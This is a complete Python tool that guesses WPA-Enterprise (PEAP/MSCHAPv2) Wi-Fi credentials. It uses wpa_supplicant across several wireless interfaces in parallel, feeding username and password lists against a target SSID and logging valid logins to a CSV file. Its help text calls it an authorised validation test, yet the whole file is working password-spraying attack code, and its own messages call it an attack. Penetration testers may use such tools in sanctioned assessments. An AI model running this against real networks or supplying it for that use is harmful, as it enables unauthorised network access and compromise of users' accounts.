#!/usr/bin/env python3

import argparse
import csv
import datetime
import importlib
import os
import queue
import sys
import threading
import time
from contextlib import suppress


DEFAULT_MAX_WAIT = 4.5
DEFAULT_TEST_INTERVAL = 0.05
QUEUE_MULTIPLIER = 2


def timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def nonempty_lines(path):
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as handle:
            for line in handle:
                value = line.rstrip("\r\n")
                if value:
                    yield value
    except OSError as exc:
        raise RuntimeError(f"Unable to read {path}: {exc}") from exc


def count_entries(path):
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as handle:
            return sum(1 for line in handle if line.rstrip("\r\n"))
    except OSError as exc:
        raise SystemExit(f"Unable to read {path}: {exc}") from exc


def initialize_output_file(path):
    if not path:
        return

    if not os.path.exists(path):
        with open(path, "w", encoding="utf-8", newline="") as handle:
            csv.writer(handle).writerow(
                ["timestamp", "ssid", "username", "password"]
            )

    with suppress(OSError):
        os.chmod(path, 0o600)


def write_valid_credential(outfile, ssid, username, password, csv_lock):
    if not outfile:
        return

    with csv_lock:
        with open(outfile, "a", encoding="utf-8", newline="") as handle:
            csv.writer(handle).writerow(
                [timestamp(), ssid, username, password]
            )


def remove_configured_networks(interface):
    for network in interface.get_networks():
        if network is not None:
            with suppress(Exception):
                interface.remove_network(network.get_path())


def connect_to_wifi(
    *, ssid, password, username, interface, outfile, print_lock, csv_lock,
    max_wait, test_interval
):
    network_object = None

    with print_lock:
        print(f"Trying {username}:{password}...", flush=True)

    network_params = {
        "ssid": ssid,
        "key_mgmt": "WPA-EAP",
        "eap": "PEAP",
        "identity": username,
        "password": password,
        "phase2": "auth=MSCHAPV2",
    }

    try:
        remove_configured_networks(interface)
        network_object = interface.add_network(network_params)
        network_path = network_object.get_path()
        interface.select_network(network_path)

        deadline = time.monotonic() + max_wait
        while time.monotonic() < deadline:
            if interface.get_state() == "completed":
                with print_lock:
                    print(
                        f"[+] VALID CREDENTIALS: {username}:{password}",
                        flush=True,
                    )
                write_valid_credential(
                    outfile, ssid, username, password, csv_lock
                )
                return True
            time.sleep(test_interval)

        return False
    finally:
        with suppress(Exception):
            interface.disconnect_network()
        if network_object is not None:
            with suppress(Exception):
                interface.remove_network(network_object.get_path())


def get_or_create_interface(supplicant, device):
    try:
        return supplicant.get_interface(device)
    except Exception:
        return supplicant.create_interface(device)


def put_until_stopped(attempts, item, stop_event):
    while not stop_event.is_set():
        try:
            attempts.put(item, timeout=0.25)
            return True
        except queue.Full:
            continue
    return False


def produce_attempts(
    *, attempts, userfile, passfile, single_password, start,
    worker_count, stop_event, producer_errors
):
    attempt_id = 0

    try:
        passwords = [single_password] if single_password is not None else nonempty_lines(passfile)

        for password in passwords:
            if stop_event.is_set():
                return

            for user_index, username in enumerate(nonempty_lines(userfile)):
                if stop_event.is_set():
                    return
                if user_index < start:
                    continue

                item = (attempt_id, user_index, username, password)
                if not put_until_stopped(attempts, item, stop_event):
                    return
                attempt_id += 1

        if not stop_event.is_set():
            for _ in range(worker_count):
                if not put_until_stopped(attempts, None, stop_event):
                    return

    except Exception as exc:
        producer_errors.append(exc)
        stop_event.set()


def worker(
    *, worker_id, device, driver_class, reactor, args, attempts,
    stop_event, print_lock, csv_lock, errors
):
    interface = None

    try:
        driver = driver_class(reactor)
        supplicant = driver.connect()
        interface = get_or_create_interface(supplicant, device)
        with print_lock:
            print(f"[*] {device}: worker-{worker_id} ready", flush=True)
    except Exception as exc:
        with print_lock:
            print(f"[!] {device}: unable to initialize: {exc}", flush=True)
        errors.append((device, exc))
        stop_event.set()
        return

    try:
        while True:
            if stop_event.is_set():
                return

            try:
                item = attempts.get(timeout=0.5)
            except queue.Empty:
                continue

            try:
                if item is None:
                    return

                attempt_id, user_index, username, password = item
                with print_lock:
                    print(
                        f"[{user_index}] ({device}/worker-{worker_id}) ",
                        end="",
                        flush=True,
                    )

                valid = connect_to_wifi(
                    ssid=args.ssid,
                    username=str(username),
                    password=str(password),
                    interface=interface,
                    outfile=args.outfile,
                    print_lock=print_lock,
                    csv_lock=csv_lock,
                    max_wait=args.max_wait,
                    test_interval=args.test_interval,
                )

                if valid and args.stop_on_success:
                    stop_event.set()
                    return

                if args.attempt_delay > 0:
                    time.sleep(args.attempt_delay)

            except Exception as exc:
                with print_lock:
                    print(
                        f"[!] {device}/worker-{worker_id} "
                        f"failed attempt {item[0] if item else '?'}: {exc}",
                        flush=True,
                    )
            finally:
                attempts.task_done()
    finally:
        if interface is not None:
            with suppress(Exception):
                interface.disconnect_network()


def parse_args(argv):
    parser = argparse.ArgumentParser(
        description="Authorized PEAP/MSCHAPv2 credential validation test.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("-i", required=True, dest="devices", metavar="interface[,interface...]")
    parser.add_argument("-e", required=True, dest="ssid")
    parser.add_argument("-u", required=True, dest="userfile")
    parser.add_argument("-P", dest="password", default=None)
    parser.add_argument("-p", dest="passfile", default=None)
    parser.add_argument("-s", dest="start", type=int, default=0, metavar="INDEX")
    parser.add_argument("-w", dest="outfile", default=None, metavar="CSV_FILE")
    parser.add_argument("-1", dest="stop_on_success", action="store_true")
    parser.add_argument("-t", dest="attempt_delay", type=float, default=0.5, metavar="SECONDS")
    parser.add_argument("--max-wait", dest="max_wait", type=float, default=DEFAULT_MAX_WAIT, metavar="SECONDS")
    parser.add_argument("--test-interval", dest="test_interval", type=float, default=DEFAULT_TEST_INTERVAL, metavar="SECONDS")
    return parser.parse_args(argv)


def validate_args(args):
    if (args.password is None) == (args.passfile is None):
        raise SystemExit("Specify exactly one of -P PASSWORD or -p PASSWORD_FILE.")
    if args.start < 0:
        raise SystemExit("The start index must be zero or greater.")
    if args.max_wait <= 0 or args.test_interval <= 0:
        raise SystemExit("--max-wait and --test-interval must be greater than zero.")
    if args.attempt_delay < 0:
        raise SystemExit("-t/--attempt-delay cannot be negative.")


def load_runtime_dependencies():
    required = ("twisted", "txdbus", "wpa_supplicant", "service_identity")
    missing = []
    for name in required:
        try:
            importlib.import_module(name)
        except ImportError:
            missing.append(name)

    if missing:
        raise SystemExit(
            "Missing runtime dependencies: " + ", ".join(missing)
        )

    try:
        from twisted.internet.selectreactor import SelectReactor
        from wpa_supplicant.core import WpaSupplicantDriver
    except AttributeError as exc:
        if "GEN_EMAIL" in str(exc):
            raise SystemExit(
                "Incompatible pyOpenSSL/cryptography versions detected."
            ) from exc
        raise SystemExit(f"Runtime dependency API error: {exc}") from exc
    except Exception as exc:
        raise SystemExit(f"Unable to load runtime dependencies: {exc}") from exc

    return SelectReactor, WpaSupplicantDriver


def main(argv=None):
    args = parse_args(argv or sys.argv[1:])
    validate_args(args)

    devices = [x.strip() for x in args.devices.split(",") if x.strip()]
    if not devices or len(devices) != len(set(devices)):
        raise SystemExit("Specify one or more unique wireless interfaces.")

    user_count = count_entries(args.userfile)
    if user_count == 0:
        raise SystemExit("The username file is empty.")
    if args.start >= user_count:
        raise SystemExit("The start index is beyond the username list.")

    if args.passfile and count_entries(args.passfile) == 0:
        raise SystemExit("The password list is empty.")

    initialize_output_file(args.outfile)

    worker_count = len(devices)
    attempts = queue.Queue(maxsize=max(1, worker_count * QUEUE_MULTIPLIER))
    print_lock = threading.Lock()
    csv_lock = threading.Lock()
    stop_event = threading.Event()
    errors = []
    producer_errors = []

    SelectReactor, driver_class = load_runtime_dependencies()
    reactor = SelectReactor()
    reactor_thread = threading.Thread(
        target=reactor.run,
        kwargs={"installSignalHandlers": 0},
        daemon=True,
        name="twisted-reactor",
    )
    reactor_thread.start()

    deadline = time.monotonic() + 5
    while not reactor.running and time.monotonic() < deadline:
        time.sleep(0.05)
    if not reactor.running:
        raise SystemExit("Twisted reactor failed to start.")

    threads = []
    producer = None

    try:
        print(f"[*] Running {worker_count} streaming worker(s).", flush=True)

        for worker_id, device in enumerate(devices, start=1):
            thread = threading.Thread(
                target=worker,
                kwargs={
                    "worker_id": worker_id,
                    "device": device,
                    "driver_class": driver_class,
                    "reactor": reactor,
                    "args": args,
                    "attempts": attempts,
                    "stop_event": stop_event,
                    "print_lock": print_lock,
                    "csv_lock": csv_lock,
                    "errors": errors,
                },
                name=f"worker-{worker_id}",
            )
            thread.start()
            threads.append(thread)

        producer = threading.Thread(
            target=produce_attempts,
            kwargs={
                "attempts": attempts,
                "userfile": args.userfile,
                "passfile": args.passfile,
                "single_password": args.password,
                "start": args.start,
                "worker_count": worker_count,
                "stop_event": stop_event,
                "producer_errors": producer_errors,
            },
            name="attempt-producer",
        )
        producer.start()

        for thread in threads:
            thread.join()
        producer.join()

        if errors:
            print("[!] One or more workers failed to initialize.", flush=True)
            return 1
        if producer_errors:
            print(f"[!] Attempt producer failed: {producer_errors[0]}", flush=True)
            return 1

        print("[*] DONE!", flush=True)
        return 0

    except KeyboardInterrupt:
        stop_event.set()
        print("\n[!] Attack stopped by user.", flush=True)
        return 130
    finally:
        stop_event.set()
        if reactor.running:
            reactor.callFromThread(reactor.stop)
        reactor_thread.join(timeout=5)


if __name__ == "__main__":
    sys.exit(main())
